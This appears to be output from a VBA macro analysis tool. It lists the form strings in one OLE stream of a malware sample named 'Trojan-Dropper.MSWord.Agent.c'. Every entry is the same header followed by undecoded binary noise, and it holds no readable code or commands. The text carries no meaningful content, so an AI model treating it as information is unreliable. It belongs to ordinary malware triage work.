VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xǈn1�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
||C�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
||#�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?<c�������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xǜO<c<������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������?���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������?���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|<�x����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c���c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������c����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������C����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���c��8g����������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|<|x?���������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i39/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
